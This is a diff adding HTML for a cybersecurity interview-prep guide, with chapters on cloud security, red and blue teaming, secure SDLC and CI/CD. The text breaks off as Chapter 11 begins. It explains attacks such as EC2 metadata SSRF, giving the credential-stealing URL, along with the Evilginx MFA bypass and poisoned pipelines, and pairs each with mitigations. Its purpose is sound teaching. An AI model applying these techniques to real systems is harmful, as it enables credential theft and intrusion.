+        <div class="sum-card"><div class="sum-card-title">Shared Responsibility</div><div class="sum-card-text">Cloud provider secures the infrastructure (hardware, hypervisor, physical). Customer secures everything built on top (OS, apps, data, IAM, network config). "Security OF the cloud vs IN the cloud."</div></div>
+        <div class="sum-card"><div class="sum-card-title">IAM Misconfig = #1 Risk</div><div class="sum-card-text">Overly permissive IAM roles, wildcard permissions (*), no MFA on root, unused access keys. IAM compromise = cloud compromise. Principle of least privilege is critical.</div></div>
+        <div class="sum-card"><div class="sum-card-title">EC2 Metadata SSRF</div><div class="sum-card-text">169.254.169.254 returns temporary IAM credentials. Exploitable via SSRF in apps running on EC2. IMDSv2 requires PUT request with token first — mitigates SSRF exploitation.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Common Cloud Misconfigs</div><div class="sum-card-text">Public S3 buckets, wildcard IAM permissions, disabled CloudTrail, unencrypted EBS, root account without MFA, security groups allowing 0.0.0.0/0 on sensitive ports.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Cloud Offense Tools</div><div class="sum-card-text">Pacu (AWS exploitation framework), ScoutSuite (multi-cloud config audit), Prowler (AWS CIS benchmark checks). All used in cloud penetration testing engagements.</div></div>
+        <div class="sum-card"><div class="sum-card-title">AWS Defense Services</div><div class="sum-card-text">GuardDuty (threat detection), CloudTrail (API audit logs), Config (resource compliance), Inspector (vulnerability assessment), Security Hub (centralized findings), Macie (PII in S3), Shield (DDoS).</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-cloud">Cloud</span><div class="term-name">Shared Responsibility Model</div><div class="term-def">Division of security responsibilities between cloud provider and customer. AWS secures physical, network, hypervisor. Customer secures OS patches, application code, data encryption, IAM configurations, network security groups.</div></div>
+        <div class="term-card"><span class="term-badge b-cloud">Cloud</span><div class="term-name">IAM (Identity and Access Management)</div><div class="term-def">Cloud service controlling who can do what to which resources. Misconfigurations (wildcard permissions, excessive roles) are the #1 cloud attack vector. Least privilege: each IAM entity gets only required permissions.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Cloud Attack</span><div class="term-name">EC2 Instance Metadata Service</div><div class="term-def">169.254.169.254 provides instance details and temporary IAM credentials. Only accessible from the instance. SSRF-exploitable to steal credentials. IMDSv2 adds session-oriented protection requiring a PUT pre-request.</div></div>
+        <div class="term-card"><span class="term-badge b-cloud">Cloud</span><div class="term-name">CloudTrail</div><div class="term-def">AWS API audit logging service. Records who called which API, from where, and when. Critical for forensic investigation and compliance. Disabling CloudTrail is a common attacker anti-forensics step — monitor for it.</div></div>
+        <div class="term-card"><span class="term-badge b-cloud">Cloud</span><div class="term-name">GuardDuty</div><div class="term-def">AWS threat detection service using ML and threat intelligence to identify suspicious activity in CloudTrail, VPC Flow Logs, and DNS logs. Detects: compromised credentials, crypto mining, unusual API calls, port scans.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Tool</span><div class="term-name">Pacu</div><div class="term-def">AWS exploitation framework (like Metasploit for AWS). Modules for IAM privilege escalation, credential theft, persistence, data exfiltration from S3. Used in cloud red team engagements.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is the shared responsibility model in cloud computing?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>The shared responsibility model defines which security tasks are handled by the cloud provider vs. the customer. The split varies by service model: IaaS (EC2): Provider secures physical infrastructure, hypervisor, and network hardware. Customer is responsible for OS patching, application code, data encryption, firewall rules, IAM policies, and network configuration. PaaS (RDS, Lambda): Provider additionally manages the runtime, OS, and database engine. Customer focuses on application code, data, and access controls. SaaS (Gmail, Salesforce): Provider manages almost everything. Customer manages user access, data governance, and configuration.</p><p>Common misconceptions: customers often assume "the cloud is secure by default" or that encryption is automatic. AWS secures the S3 service infrastructure — but whether a specific bucket is public or private, whether the data in it is encrypted, and who can access it are entirely the customer's responsibility. IAM misconfigurations, public S3 buckets, unencrypted databases, and disabled logging are all customer-side failures, not provider failures. The 2019 Capital One breach is an example — AWS was not breached; a misconfigured WAF and overly permissive IAM role (customer's responsibility) enabled data exfiltration.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">How does EC2 Instance Metadata SSRF work and how is it mitigated?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Every EC2 instance can access its own metadata via a non-routable link-local address (169.254.169.254). This service provides instance details, user-data scripts, and most critically, temporary IAM credentials for any IAM role attached to the instance. These endpoints are accessible without authentication from the instance itself.</p><p>The SSRF attack: if an application running on EC2 has an SSRF vulnerability (fetches a URL based on user input), an attacker submits: http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server (which is the EC2 instance) fetches this URL and returns the JSON response containing AccessKeyId, SecretAccessKey, and Token. The attacker now has temporary AWS credentials and can make API calls with whatever permissions the EC2 role has — potentially S3 data access, EC2 manipulation, or privilege escalation to other roles. Mitigation: IMDSv2 (Instance Metadata Service v2) requires a two-step process: first, a PUT request to get a session token, then use that token in the GET request. PUT requests cannot be made by typical SSRF vulnerabilities (they require a specific Content-Type header and are often blocked by server-side HTTP clients). Enforce IMDSv2 in instance configuration. Additionally: restrict EC2 IAM roles to minimum necessary permissions, monitor for unusual EC2 metadata API calls in CloudTrail, use VPC endpoint policies to restrict S3 access.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">What are the most critical cloud security misconfigurations and how do you find them?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Most critical misconfigurations: Public S3 buckets (data directly accessible to anyone on the internet — caused multiple major breaches including Accenture, Verizon), Wildcard IAM permissions (* on * — grants every action on every resource), Root account without MFA (root has unlimited access, no restrictions), Disabled CloudTrail (no API audit trail — attacker can act undetected), Security groups allowing 0.0.0.0/0 on sensitive ports (22/SSH, 3389/RDP, 1433/SQL Server exposed to internet), Unencrypted S3 buckets and EBS volumes, Unused long-term IAM access keys (compromised keys from a developer's GitHub commit remain valid indefinitely).</p><p>How to find them: ScoutSuite (open-source, multi-cloud — audits AWS, Azure, GCP configurations and generates HTML report of findings organized by service). Prowler (AWS CIS Benchmark checks — 250+ controls covering all AWS services). AWS Security Hub (AWS-native, aggregates findings from GuardDuty, Inspector, Macie, and third-party tools). AWS Config (continuous compliance monitoring — rules detect non-compliant resources in real time). Trusted Advisor (AWS-native recommendations including security checks). For authorized penetration testing, Pacu can actively test which misconfigurations are actually exploitable rather than just theoretical violations.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Ch 8 -->
+<div class="chapter" data-search="red blue team purple teaming kill chain mitre attack social engineering evilginx mfa bypass">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 08</span>
+    <div class="ch-info">
+      <div class="ch-title">Red &amp; Blue Teaming</div>
+      <div class="ch-desc">Red team kill chain, purple teaming, color team framework, SET, BeEF, Evilginx MFA bypass, Veil, Rubber Ducky, MITRE ATT&CK, network routing attacks.</div>
+      <div class="ch-tags"><span class="ch-tag">Red Team</span><span class="ch-tag">Blue Team</span><span class="ch-tag">MITRE ATT&CK</span><span class="ch-tag">MFA Bypass</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">Red Team Kill Chain</div><div class="sum-card-text">Scoping → Recon → Weaponization → Delivery → Exploitation → Post-exploitation → Reporting. Red team differs from pentest: longer timeline, social engineering included, blue team unaware.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Purple Teaming</div><div class="sum-card-text">Red and blue teams work collaboratively with immediate feedback loops. Red runs an attack → blue team sees it in SIEM → immediate discussion of detection gaps. More efficient than separate exercises.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Evilginx MFA Bypass</div><div class="sum-card-text">MITM reverse proxy that sits between victim and legitimate site. Captures session cookies after MFA completes — attacker gets the authenticated session token, not just credentials. Bypasses all MFA methods.</div></div>
+        <div class="sum-card"><div class="sum-card-title">MITRE ATT&CK</div><div class="sum-card-text">14 tactic categories (Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact). Used by both red and blue teams.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Color Team Framework</div><div class="sum-card-text">Red (attacks), Blue (defends), Purple (collaborative), White (facilitates/judges), Green (improves blue from red learnings), Yellow (builders/developers). All contribute to security posture.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Offensive Hardware</div><div class="sum-card-text">Rubber Ducky (USB keystroke injection), WiFi Pineapple (rogue AP/MITM), LAN Turtle (covert network implant), RFID cloners (badge copying for physical access). Physical red team tools.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-att">Red Team</span><div class="term-name">Evilginx</div><div class="term-def">MFA bypass tool acting as a MITM reverse proxy between victim and real site. Victim completes full authentication including MFA. Evilginx captures the resulting session cookie. Attacker uses cookie for authenticated access — bypassing all MFA methods.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Red Team</span><div class="term-name">Veil Framework</div><div class="term-def">Payload generation framework for creating AV-evasive shellcode. Generates payloads using various encoding/encryption techniques to bypass signature-based antivirus detection.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Framework</span><div class="term-name">MITRE ATT&CK</div><div class="term-def">Knowledge base of adversary tactics, techniques, and procedures based on real-world observations. 14 tactic columns, each with specific techniques. Used for threat intelligence, detection engineering, red team planning, and security gap analysis.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Tool</span><div class="term-name">BeEF (Browser Exploitation Framework)</div><div class="term-def">Post-XSS exploitation framework. Once a browser is hooked (via XSS), BeEF can: perform network discovery from the browser, steal credentials, execute social engineering attacks, and pivot through the browser to internal resources.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Tool</span><div class="term-name">SET (Social Engineering Toolkit)</div><div class="sum-card-text">Metasploit-compatible framework for social engineering attacks: spear phishing, credential harvesting pages, Java applet attacks, SMS/email spoofing. Automates the human element of red team operations.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Blue Team</span><div class="term-name">Purple Teaming</div><div class="term-def">Collaborative red/blue exercise with immediate feedback. Red runs an attack → blue verifies detection → gap identified immediately → detection improved → repeat. More efficient than separate adversarial exercises.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">How does Evilginx bypass MFA and what defensive measures work against it?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Evilginx operates as a reverse proxy between the victim's browser and the legitimate service. The attacker registers a convincing phishing domain (microsofft.com instead of microsoft.com) and configures Evilginx with phishlets (templates for specific sites). The victim clicks a phishing link, lands on Evilginx's proxy, and sees the legitimate site's actual content (because Evilginx fetches it in real time). The victim enters credentials and completes MFA — TOTP code, push notification, SMS code — all of which Evilginx forwards to the real site. After successful authentication, the real site returns a session cookie to Evilginx's proxy, which captures it before forwarding to the victim's browser. The attacker now has the authenticated session cookie and can impersonate the user without needing credentials or MFA.</p><p>Why standard MFA fails: TOTP codes, SMS codes, and push notifications all validate the real session that Evilginx completed — they don't protect the resulting session token. Defenses that work: FIDO2/WebAuthn hardware keys (YubiKey) are phishing-resistant — they bind the authentication to the legitimate domain using origin checking. If the origin doesn't match, the key refuses to respond. Conditional Access policies that evaluate device compliance, location, and risk scores can detect anomalous sessions even with valid cookies. Short-lived session tokens with continuous re-authentication requirements limit the useful window of a stolen cookie.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">What is the difference between a red team engagement and a penetration test?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Penetration tests are time-boxed, scope-limited exercises to find as many vulnerabilities as possible. The blue team is typically aware the test is happening. Findings are comprehensively documented. The goal is vulnerability discovery and risk quantification. Typically 1-3 weeks.</p><p>Red team engagements simulate realistic, targeted adversaries with a specific objective (compromise crown jewel systems, exfiltrate specific data). The blue team is NOT told — testing their actual detection and response capability is a primary goal. The red team uses the full kill chain: OSINT, social engineering, physical access attempts, phishing campaigns — not just technical exploitation. The red team intentionally avoids triggering detections when possible (stealth is valued). Objectives-based: success means reaching the goal, not finding every vulnerability. Duration: weeks to months. Output: attack narrative showing the realistic threat, detection gaps, and dwell time analysis. Both are valuable but answer different questions: "what vulnerabilities exist?" (pentest) vs "could a real attacker achieve their objective against our current defenses?" (red team).</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">How is MITRE ATT&CK used by blue teams for detection engineering?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>MITRE ATT&CK provides a structured taxonomy of real-world adversary techniques with concrete examples, data sources, and detection opportunities. Blue teams use it for: Detection coverage mapping — map existing SIEM rules and EDR detections to ATT&CK technique IDs. Identify gaps where no detection exists. Prioritize building new detections for high-frequency or high-impact techniques. Threat intelligence operationalization — when a threat intel report says "APT29 uses technique T1059.001" (PowerShell execution), you can immediately look up which data sources (PowerShell logs, process creation events) and detection logic to implement. Adversary emulation planning — purple team exercises simulate specific ATT&CK techniques. Red team runs technique T1055 (process injection), blue team checks if SIEM/EDR generated an alert, gap analysis identifies what logging or rule changes are needed. Hunt hypothesis generation — "do we have evidence of T1078 (Valid Accounts being used for lateral movement)?" drives proactive threat hunting using specific search queries. The ATT&CK Navigator tool visualizes coverage as a heat map — each technique colored based on whether detection exists, allowing leadership to see overall coverage in a single view.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Chapters 9-15 condensed but complete -->
+<div class="chapter" data-search="sdlc security shift left secure coding git hooks dependabot pre-commit secrets detection threat modeling ci cd pipeline">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 09</span>
+    <div class="ch-info">
+      <div class="ch-title">Security in SDLC</div>
+      <div class="ch-desc">Shift left, Git security features (hooks, signed commits, Dependabot, CodeQL), secrets detection (Git Secrets, TruffleHog, Gitrob), secure SDLC stages, BRD integration.</div>
+      <div class="ch-tags"><span class="ch-tag">Shift Left</span><span class="ch-tag">Git Security</span><span class="ch-tag">Secrets Detection</span><span class="ch-tag">Secure SDLC</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">Shift Left</div><div class="sum-card-text">Move security earlier in SDLC. NIST: fixing post-release costs up to 60x more than fixing in design phase. Integrate security into every sprint, not just pre-release testing.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Pre-commit Hooks</div><div class="sum-card-text">Scripts in .git/hooks/pre-commit that run before commits. Exit non-zero = commit aborted. Uses: SAST, secrets scanning, code formatting. Blocks bad code before it enters the repo.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Secrets Detection</div><div class="sum-card-text">Git Secrets: regex-based pre-commit hook. TruffleHog: entropy analysis + regex across full git history including deleted commits. Gitrob: org-wide GitHub scanning. Use all three together.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Dependabot</div><div class="sum-card-text">GitHub tool monitoring dependencies for CVEs. Auto-opens PRs for vulnerable package updates. Configure in .github/dependabot.yml. Separate dev vs production deps for prioritization.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Signed Commits</div><div class="sum-card-text">GPG signatures on commits prove authorship and that code hasn't been tampered with. PCI-DSS audit trail requirement. Set up: git config user.signingkey [KEY_ID], then git commit -S.</div></div>
+        <div class="sum-card"><div class="sum-card-title">PR Hijacking</div><div class="sum-card-text">Reviewer modifies PR code then self-approves — GitHub doesn't require re-review. Mitigate: require approval from most recent pusher, enforce multiple reviewers.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-sec">Git</span><div class="term-name">Pre-commit hook</div><div class="term-def">Script in .git/hooks/pre-commit that executes before a commit is created. Non-zero exit aborts the commit. Used for SAST, secrets scanning, code formatting checks.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Git</span><div class="term-name">Post-commit hook</div><div class="term-def">Runs after a successful commit. Cannot abort the commit. Used to trigger CI/CD pipelines, send notifications, kick off DAST scans against staging environments.</div></div>
+        <div class="term-card"><span class="term-badge b-code">Tool</span><div class="term-name">TruffleHog</div><div class="term-def">Secrets detection using entropy analysis + regex across entire git history. Catches secrets committed and later "deleted" — git history is permanent. Language-agnostic.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Process</span><div class="term-name">Design review vs designed review</div><div class="term-def">Design review: flexible collaborative security assessment adapting to current threats. Designed review: fixed checklist — inflexible, misses novel threats. Design reviews recommended.</div></div>
+        <div class="term-card"><span class="term-badge b-code">Tool</span><div class="term-name">SonarQube (SAST)</div><div class="term-def">Open-source code quality and SAST platform. Integrates into CI pipelines. Quality gates block progression when critical vulnerabilities are found. Supports Java, JS, Python, C#, and more.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Process</span><div class="term-name">Secure design principles</div><div class="term-def">Least privilege, defense in depth, secure by default, fail securely, separation of duties. Applied during architecture phase before any code is written.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">Why is shifting left so cost-effective for security?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Shifting left means addressing security issues in the earlier phases of the SDLC — during design and coding — rather than testing pre-release or responding to production incidents. The cost differential is dramatic: NIST research shows fixing a security flaw in production costs up to 60x more than fixing the same flaw during the design phase.</p><p>The reason: when a developer finds a bug while writing a function, fixing it takes minutes. When the same bug is found in a pre-release pentest, it may require refactoring an entire feature plus regression testing of everything that depends on it — potentially weeks. When found in production after a breach, remediation also includes incident response costs, customer notification, regulatory fines, reputational damage, and emergency security consulting — potentially millions. Shift left practices: SAST in the developer IDE (instant feedback), pre-commit hooks blocking insecure code, threat modeling in design phase before any code exists, security requirements in every user story (design-time cost = minutes; post-release change = weeks+).</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">Why is deleting a secret from git insufficient — and what's the right remediation?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Git is designed to never truly forget. Every commit is permanently recorded in the repository's history. When you delete a file in a new commit, the original commit containing the secret still exists in the history — accessible to anyone who runs git log and git show. Automated bots scan public repositories continuously; a secret committed even briefly to a public repo has likely been captured before deletion.</p><p>The correct response has two parts: Immediately rotate/revoke the exposed credential — assume it's already compromised. This is the most critical step. Changing or deleting the file in git does nothing if the credential is already active and in use by an attacker. Optionally rewrite git history using git filter-branch or BFB Repo Cleaner to remove the secret from all historical commits. Note: this changes all commit hashes, must be force-pushed, and all contributors need to re-clone. Disruptive but sometimes required for compliance. Prevention: TruffleHog as a pre-commit hook scans all history including branches. Git Secrets blocks commits matching secret patterns. Neither replaces proper secrets management (Vault, AWS Secrets Manager) where secrets are never in code at all.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">What is pull request hijacking and how do you defend against it?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>GitHub allows anyone with reviewer permissions to also push commits to a PR's branch. A malicious or compromised reviewer can modify the PR code to add malicious logic, then approve their own modification. The original PR author isn't notified, no additional review is required, and the change appears in git history but may go unnoticed before merge.</p><p>Defenses: Enable "Dismiss stale pull request approvals when new commits are pushed" — this cancels existing approvals whenever anyone pushes to a PR, forcing complete re-review. Enable "Require approval from the most recent pusher" — whoever last pushed to a PR cannot be the final approver for that PR. Require multiple reviewers (2+) — a single compromised reviewer cannot unilaterally approve. Enable signed commits — all changes are cryptographically attributed to a specific identity. Audit PR activity in GitHub's audit log for unusual approval patterns (reviewer who modified the PR is also the final approver).</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" data-search="ci cd security supply chain dependency confusion solarwinds circleci poisoned pipeline secrets management vault approle artifact signing perfect forward secrecy">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 10</span>
+    <div class="ch-info">
+      <div class="ch-title">Security in CI/CD</div>
+      <div class="ch-desc">CI/CD attack vectors (PPE, PBAC, secrets leakage), supply chain attacks, dependency confusion, SBOM, HashiCorp Vault AppRole, artifact signing, perfect forward secrecy, DefectDojo.</div>
+      <div class="ch-tags"><span class="ch-tag">Supply Chain</span><span class="ch-tag">Secrets Management</span><span class="ch-tag">Artifact Signing</span><span class="ch-tag">PPE</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">CI/CD as High-Value Target</div><div class="sum-card-text">Pipeline has privileged access to all environments and credentials it serves. CircleCI breach: entire supply chain exposed via one CI tool compromise. "Breach the pipeline = breach everything it deploys."</div></div>
+        <div class="sum-card"><div class="sum-card-title">Dependency Confusion</div><div class="sum-card-text">Attacker registers malicious public package with same name as private internal package. Package managers prefer public registries. Alex Birsan (2021) earned ~$130K in bug bounties against Apple, PayPal, Microsoft.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Poisoned Pipeline Execution (PPE)</div><div class="sum-card-text">Attacker modifies Jenkinsfile/.gitlab-ci.yml in a PR to inject malicious commands that execute with pipeline privileges during the build process.</div></div>
+        <div class="sum-card"><div class="sum-card-title">HashiCorp Vault AppRole</div><div class="sum-card-text">Machine-to-machine auth. Static Role ID (like username) + dynamic Secret ID (like single-use password). Secret IDs are short-lived and limited-use. CI/CD gets fresh credentials per build run.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Perfect Forward Secrecy</div><div class="sum-card-text">Ephemeral session keys generated per session. If server private key is stolen (Heartbleed), past sessions can't be decrypted. TLS 1.3 mandates PFS via ECDHE. Removes RSA key exchange cipher suites.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Artifact Signing</div><div class="sum-card-text">Digitally sign build artifacts after testing, before deploy. Proves integrity and authenticity. If artifact is tampered with in registry, signature verification fails. Tools: Sigstore/Cosign, Notary, GPG.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-att">Attack</span><div class="term-name">Poisoned Pipeline Execution (PPE)</div><div class="term-def">Attacker modifies CI config files (Jenkinsfile, .gitlab-ci.yml) via a PR to inject malicious build steps that execute with pipeline's elevated privileges and credentials.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Attack</span><div class="term-name">Dependency Confusion</div><div class="term-def">Registers malicious public package with same name as private internal package. Package managers checking public before private download the malicious version. Mitigate by squatting the public package name.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Tool</span><div class="term-name">SBOM (Software Bill of Materials)</div><div class="term-def">Complete inventory of all software components, libraries, and versions in an application. Like an ingredient list. Required for US federal software procurement. Generated by SCA tools. Critical for rapid CVE response.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Secrets</span><div class="term-name">AppRole Authentication</div><div class="term-def">Vault's machine-centric auth. Static Role ID + dynamic single-use Secret ID. Applications authenticate without long-lived static credentials. Secret IDs expire after use and time — limits breach window.</div></div>
+        <div class="term-card"><span class="term-badge b-crypto">Crypto</span><div class="term-name">Perfect Forward Secrecy (PFS)</div><div class="term-def">Property ensuring past session traffic remains secure even if server's long-term private key is compromised later. Achieved via ephemeral ECDH key exchange. Mandated in TLS 1.3. Defeats Heartbleed-style retroactive decryption.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Tool</span><div class="term-name">DefectDojo</div><div class="term-def">Open-source vulnerability management platform. Aggregates SAST, DAST, SCA findings. Normalizes formats, deduplicates, prioritizes by severity. Tracks remediation progress. API integration with CI/CD pipelines.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">Why is the CI/CD pipeline considered a critical security target?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>The CI/CD pipeline has more privileged access to organizational systems than almost any other component. It holds credentials for source code repositories, cloud environments, staging and production servers, databases, secrets stores, and external APIs. It can read all source code, modify build artifacts, and deploy directly to production. A single compromise of the CI/CD system effectively compromises everything it can reach.</p><p>The CircleCI breach (2022) demonstrated this: because the CI platform itself was compromised, all secrets and credentials that customers had stored in CircleCI were exposed. The attacker didn't need to breach each customer individually — compromising the CI/CD platform gave access to all of them simultaneously. This is why CI/CD security must be treated with the same rigor as securing the production environment itself.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">What is Perfect Forward Secrecy and why did Heartbleed make it critical?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>PFS is a property ensuring that past communication sessions remain secure even if a server's long-term private key is later compromised. Achieved using ephemeral key exchange (ECDHE): a fresh, temporary key pair is generated for each session. The session key is derived from this exchange — the server's long-term private key is only used for authentication, not for encrypting session data. After the session ends, ephemeral keys are deleted.</p><p>Without PFS: classic TLS used RSA key exchange — client encrypted a pre-master secret with the server's public key; server decrypted with its private key. If an attacker recorded encrypted traffic and later obtained the private key (via Heartbleed, which read server private keys from OpenSSL memory), they could retroactively decrypt all previously captured sessions. Heartbleed was a memory disclosure bug allowing attackers to repeatedly read 64KB chunks of server memory, potentially extracting private keys, session tokens, and passwords. With PFS: even with the private key stolen via Heartbleed, the ephemeral session keys were generated separately, were never stored, and are gone. The recorded encrypted traffic cannot be decrypted. This is why TLS 1.3 mandates PFS and removed all non-PFS cipher suites.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">Your CI/CD platform was breached. What are the immediate response steps?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>A CI/CD platform breach is Tier 1 — it has access to all environments it serves. Step 1 (Immediate — containment): Revoke ALL credentials the CI/CD platform had access to. This is time-critical. Rotate API keys, database passwords, cloud IAM credentials, SSH keys, service account tokens, signing keys. Disable the CI/CD platform to stop ongoing access. Step 2 (Scope assessment): Review audit logs to determine what the attacker accessed. Which pipelines ran? Which secrets were retrieved? Which deployments were triggered? Assume access for the entire undetected window.</p><p>Step 3 (Artifact integrity): Any artifact built during the breach window is potentially compromised. Pull all potentially affected deployments from production. Re-build from source in a clean, isolated environment that the compromised platform had no access to. Verify artifact signatures if they existed pre-breach. Step 4 (Source code audit): Check for malicious commits or build script modifications made by the platform's service account during the breach window. Step 5 (Customer/stakeholder notification): If serving external customers (like CircleCI), notify them immediately to rotate their credentials. Step 6 (Rebuild): Rebuild CI/CD from scratch with MFA on admin accounts, principle of least privilege for service accounts, short-lived credentials (AppRole secrets, not static keys), and enhanced monitoring. Future posture: use ephemeral credentials that expire per-build, never store long-term secrets in CI environment variables.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" data-search="firewalls edr endpoint protection utm antimalware apt detection process hollowing fileless malware lotl powershell living off land">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 11</span>
+    <div class="ch-info">
+      <div class="ch-title">Firewalls, EDR, Anti-Malware &amp; UTMs</div>
+      <div class="ch-desc">Firewall types (packet filtering, stateful, NGFW, cloud), EDR principles, APT detection, process hollowing, thread injection, fileless malware, LotL, EDR bypass techniques.</div>
+      <div class="ch-tags"><span class="ch-tag">Firewalls</span><span class="ch-tag">EDR</span><span class="ch-tag">APT Detection</span><span class="ch-tag">Memory Injection</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
